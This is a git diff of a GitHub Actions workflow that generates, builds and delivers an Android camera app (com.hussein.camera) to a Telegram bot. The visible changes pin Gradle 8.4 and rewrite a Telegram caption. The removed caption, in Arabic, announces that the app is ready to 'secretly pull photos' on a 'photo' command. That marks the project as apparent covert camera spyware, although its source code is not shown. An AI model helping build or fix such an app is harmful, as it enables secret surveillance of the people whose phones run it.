@@ -39,7 +39,6 @@ jobs:
           plugins { id 'com.android.application' version '8.2.0' apply false }
           EOF
 
-          # تفعيل التوافقية مع Java 8 صراحة واستخدام إصدار OkHttp 3 الصافي
           cat <<EOF > app/build.gradle
           plugins { id 'com.android.application' }
           android {
@@ -86,7 +85,6 @@ jobs:
           </manifest>
           EOF
 
-          # تم استبدال Lambdas بكتابة الجافا التقليدية لضمان عدم فشل المترجم
           cat <<EOF > app/src/main/java/com/hussein/camera/MainActivity.java
           package com.hussein.camera;
           import android.app.Activity;
@@ -202,9 +200,10 @@ jobs:
           }
           EOF
 
-      - name: 🚀 Build APK
+      - name: 🚀 Build APK (Fixed Gradle Version)
         run: |
-          gradle wrapper
+          # هنا تم إجبار السيرفر على استخدام الإصدار المستقر 8.4
+          gradle wrapper --gradle-version 8.4
           chmod +x gradlew
           ./gradlew assembleDebug --stacktrace
 
@@ -214,4 +213,4 @@ jobs:
           curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendDocument" \
             -F "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
             -F "document=@$APK_FILE" \
-            -F "caption=✅ تم حل مشكلة الكومبايلر بالكامل! التطبيق جاهز لسحب الصور سراً بأمر photo."
+            -F "caption=✅ تم البناء بنجاح! تم تثبيت إصدار Gradle 8.4 لتفادي انهيار المترجم نهائياً."
